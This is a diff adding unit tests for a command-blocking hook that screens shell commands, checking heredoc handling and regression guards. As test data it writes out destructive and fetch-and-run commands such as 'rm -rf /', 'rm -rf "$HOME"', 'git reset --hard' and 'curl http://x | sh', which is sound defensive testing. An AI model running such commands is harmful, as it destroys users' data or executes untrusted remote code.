@@ -35,6 +35,54 @@ describe('block-dangerous-commands', () => {
   it('allows a safe command', () => {
     expect(checkCommand('ls -la').blocked).toBe(false);
   });
+
+  it('does not block a dangerous command mentioned inside a heredoc body', () => {
+    const cmd = "cat > file.txt <<'EOF'\ngit reset --hard\nEOF";
+    expect(checkCommand(cmd).blocked).toBe(false);
+  });
+
+  it('does not block a heredoc body containing rm -rf /', () => {
+    const cmd = "cat > file.txt <<'EOF'\nrm -rf /\nEOF";
+    expect(checkCommand(cmd).blocked).toBe(false);
+  });
+
+  it('still blocks a dangerous command that has a heredoc attached', () => {
+    const cmd = "rm -rf / <<'EOF'\nx\nEOF";
+    const r = checkCommand(cmd);
+    expect(r.blocked).toBe(true);
+    expect(r.pattern.id).toBe('rm-root');
+  });
+
+  it('still blocks curl piped to sh (regression guard: no operator segmentation)', () => {
+    const r = checkCommand('curl http://x | sh');
+    expect(r.blocked).toBe(true);
+    expect(r.pattern.id).toBe('curl-pipe-sh');
+  });
+
+  it('still blocks rm -rf "$HOME" (regression guard: no quote stripping)', () => {
+    const r = checkCommand('rm -rf "$HOME"');
+    expect(r.blocked).toBe(true);
+    expect(r.pattern.id).toBe('rm-home-var');
+  });
+
+  it('still blocks rm -rf /etc (regression guard: no quote stripping)', () => {
+    // rm-system has no ["']? quote tolerance (unlike rm-home/rm-home-var),
+    // so a quoted "/etc" is outside this pattern's coverage independent of
+    // heredoc stripping; the unquoted form is the guard for this change.
+    const r = checkCommand('rm -rf /etc');
+    expect(r.blocked).toBe(true);
+    expect(r.pattern.id).toBe('rm-system');
+  });
+
+  it('blocks a dangerous command quoted as an argument to a harmless command (documented residual)', () => {
+    // A pattern set that matches command text cannot distinguish an operand
+    // from a mention: `echo "git reset --hard"` never executes the reset,
+    // but blocking it is the conservative side of the tradeoff this hook
+    // makes. This case is intentional, not a gap to close.
+    const r = checkCommand('echo "git reset --hard"');
+    expect(r.blocked).toBe(true);
+    expect(r.pattern.id).toBe('git-reset-hard');
+  });
 });
 
 describe('protect-secrets', () => {
